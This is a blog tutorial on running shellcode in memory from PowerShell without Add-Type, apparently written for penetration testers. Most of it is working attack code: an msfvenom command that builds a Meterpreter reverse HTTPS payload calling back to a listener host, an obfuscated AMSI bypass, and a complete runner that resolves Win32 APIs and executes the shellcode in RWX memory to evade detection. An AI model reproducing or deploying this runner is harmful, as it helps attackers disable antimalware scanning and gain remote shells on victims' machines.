---
title: "Stealthy PowerShell Shellcode Execution: Diskless Techniques with UnsafeNativeMethods"
seoTitle: "Diskless PowerShell Execution with UnsafeNativeMethods"
description: "A technical walkthrough of diskless PowerShell shellcode execution using UnsafeNativeMethods, dynamic Win32 API resolution, and in-memory delegates."
deck: "A lab walkthrough of resolving Win32 APIs dynamically and executing shellcode in memory without the disk artifacts produced by Add-Type."
slug: "stealthy-powershell-shellcode-execution-diskless-techniques-with-unsafenativemethods"
file: "03"
publishedAt: "2025-03-31T07:16:26.343Z"
updatedAt: "2026-08-02T00:00:00.000Z"
category: "Offensive Research"
tags:
  - "PowerShell"
  - "UnsafeNativeMethods"
  - "In-Memory Execution"
  - "Offensive Security"
coverImage: "/images/posts/powershell-unsafenativemethods-cover.webp"
coverImageAlt: "Dark technical illustration of PowerShell resolving Windows APIs for in-memory execution"
coverImageWidth: 1792
coverImageHeight: 1024
status: "Published"
draft: false
---
PowerShell is a versatile scripting language commonly used for system administration, automation, and penetration testing. In certain scenarios, executing shellcode in memory without touching the disk can be advantageous, especially for evading detection and maintaining stealth. However, traditional methods like `Add-Type` can leave residues on the disk, potentially alerting vigilant security measures. In this tutorial, we’ll explore a method to run PowerShell shellcode without relying on `Add-Type`, leveraging `UnsafeNativeMethods` for dynamic function address lookup.

## Features of the Approach

* **No Disk Residues:** Unlike `Add-Type`, which creates C# residues on disk by generating `.cs` and `.dll` files, this method operates entirely in memory, leaving no traces on disk.

* **Dynamic Lookup:** Leveraging `UnsafeNativeMethods`, we can dynamically obtain the addresses of Win32 API functions such as `GetProcAddress` and `GetModuleHandle`, enabling us to execute shellcode without relying on pre-existing assemblies.


## Payload Generation

Before diving into the PowerShell code, let’s first generate the shellcode payload. We’ll use Metasploit’s `msfvenom` to generate a Meterpreter reverse HTTPS payload:

```bash
msfvenom -p windows/meterpreter/reverse_https LHOST=192.168.119.120 LPORT=443 EXITFUNC=thread -f ps1
```

This command generates the shellcode in PowerShell format, ready to be embedded into our script.

## Shellcode Runner Script

Now, let’s delve into the PowerShell script `run.ps1` that executes the shellcode without using `Add-Type`. We’ll break down the script step by step.

### 1\. Bypassing AMSI

The first line of our script is responsible for bypassing AMSI (Antimalware Scan Interface) by modifying a static field in the `System.Management.Automation` assembly.

```csharp
[Ref].Assembly.GetType('System.Management.Automation.'+$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQBtAHMAaQBVAHQAaQBsAHMA')))).GetField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('YQBtAHMAaQBJAG4AaQB0AEYAYQBpAGwAZQBkAA=='))),'NonPublic,Static').SetValue($null,$true)
```

### 2\. Helper Functions

Next, we define two helper functions:

#### `LookupFunc`

This function dynamically looks up the address of Win32 API functions such as `GetProcAddress` and `GetModuleHandle`.

```csharp
function LookupFunc {
    Param ($moduleName, $functionName)
    $assem = ([AppDomain]::CurrentDomain.GetAssemblies() |
              Where-Object { $_.GlobalAssemblyCache -And $_.Location.Split('\\')[-1].Equals('System.dll') }).GetType('Microsoft.Win32.UnsafeNativeMethods')
    $tmp = @()
    $assem.GetMethods() | ForEach-Object {
        If ($_.Name -eq "GetProcAddress") {
            $tmp += $_
        }
    }
    return $tmp[0].Invoke($null, @(
        ($assem.GetMethod('GetModuleHandle')).Invoke($null, @($moduleName)),
        $functionName
    ))
}
```

#### `getDelegateType`

This function defines a delegate type for invoking Win32 API functions.

```csharp
function getDelegateType {
    Param (
        [Parameter(Position = 0, Mandatory = $True)] [Type[]] $func,
        [Parameter(Position = 1)] [Type] $delType = [Void]
    )
    $type = [AppDomain]::CurrentDomain.DefineDynamicAssembly((New-Object System.Reflection.AssemblyName('ReflectedDelegate')), [System.Reflection.Emit.AssemblyBuilderAccess]::Run).DefineDynamicModule('InMemoryModule', $false).DefineType('MyDelegateType', 'Class, Public, Sealed, AnsiClass, AutoClass', [System.MulticastDelegate])
    $type.DefineConstructor('RTSpecialName, HideBySig, Public', [System.Reflection.CallingConventions]::Standard, $func).SetImplementationFlags('Runtime, Managed')
    $type.DefineMethod('Invoke', 'Public, HideBySig, NewSlot, Virtual', $delType, $func).SetImplementationFlags('Runtime, Managed')
    return $type.CreateType()
}
```

### 3\. Memory Allocation and Shellcode Injection

After defining the helper functions, we allocate memory and copy the shellcode into it.

```csharp
$lpMem = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((LookupFunc kernel32.dll VirtualAlloc), (getDelegateType @([IntPtr], [UInt32], [UInt32], [UInt32]) ([IntPtr]))).Invoke([IntPtr]::Zero, 0x1000, 0x3000, 0x40)

[Byte[]] $buf = # Shellcode goes here

[System.Runtime.InteropServices.Marshal]::Copy($buf, 0, $lpMem, $buf.length)
```

### 4\. Thread Creation and Execution

Next, we create a new thread to execute the shellcode.

```csharp
$hThread = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((LookupFunc kernel32.dll CreateThread), (getDelegateType @([IntPtr], [UInt32], [IntPtr], [IntPtr], [UInt32], [IntPtr]) ([IntPtr]))).Invoke([IntPtr]::Zero,0,$lpMem,[IntPtr]::Zero,0,[IntPtr]::Zero)
```

### 5\. Waiting for Thread Completion

Finally, we wait for the thread to finish execution.

```csharp
[System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((LookupFunc kernel32.dll WaitForSingleObject), (getDelegateType @([IntPtr], [Int32]) ([Int]))).Invoke($hThread, 0xFFFFFFFF)
```

## Full Script

```csharp
[Ref].Assembly.GetType('System.Management.Automation.'+$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQBtAHMAaQBVAHQAaQBsAHMA')))).GetField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('YQBtAHMAaQBJAG4AaQB0AEYAYQBpAGwAZQBkAA=='))),'NonPublic,Static').SetValue($null,$true)

function LookupFunc {
    Param ($moduleName, $functionName)
    $assem = ([AppDomain]::CurrentDomain.GetAssemblies() |
              Where-Object { $_.GlobalAssemblyCache -And $_.Location.Split('\\')[-1].Equals('System.dll') }).GetType('Microsoft.Win32.UnsafeNativeMethods')
    $tmp = @()
    $assem.GetMethods() | ForEach-Object {
        If ($_.Name -eq "GetProcAddress") {
            $tmp += $_
        }
    }
    return $tmp[0].Invoke($null, @(
        ($assem.GetMethod('GetModuleHandle')).Invoke($null, @($moduleName)),
        $functionName
    ))
}

function getDelegateType {
    Param (
        [Parameter(Position = 0, Mandatory = $True)] [Type[]] $func,
        [Parameter(Position = 1)] [Type] $delType = [Void]
    )
    $type = [AppDomain]::CurrentDomain.DefineDynamicAssembly((New-Object System.Reflection.AssemblyName('ReflectedDelegate')), [System.Reflection.Emit.AssemblyBuilderAccess]::Run).DefineDynamicModule('InMemoryModule', $false).DefineType('MyDelegateType', 'Class, Public, Sealed, AnsiClass, AutoClass', [System.MulticastDelegate])
    $type.DefineConstructor('RTSpecialName, HideBySig, Public', [System.Reflection.CallingConventions]::Standard, $func).SetImplementationFlags('Runtime, Managed')
    $type.DefineMethod('Invoke', 'Public, HideBySig, NewSlot, Virtual', $delType, $func).SetImplementationFlags('Runtime, Managed')
    return $type.CreateType()
}

$lpMem = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((LookupFunc kernel32.dll VirtualAlloc), (getDelegateType @([IntPtr], [UInt32], [UInt32], [UInt32]) ([IntPtr]))).Invoke([IntPtr]::Zero, 0x1000, 0x3000, 0x40)

[Byte[]] $buf = 0xfc,0xe8,0x82,0x0,0x0,0x0...

[System.Runtime.InteropServices.Marshal]::Copy($buf, 0, $lpMem, $buf.length)

$hThread = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((LookupFunc kernel32.dll CreateThread), (getDelegateType @([IntPtr], [UInt32], [IntPtr], [IntPtr], [UInt32], [IntPtr]) ([IntPtr]))).Invoke([IntPtr]::Zero,0,$lpMem,[IntPtr]::Zero,0,[IntPtr]::Zero)

[System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((LookupFunc kernel32.dll WaitForSingleObject), (getDelegateType @([IntPtr], [Int32]) ([Int]))).Invoke($hThread, 0xFFFFFFFF)
```
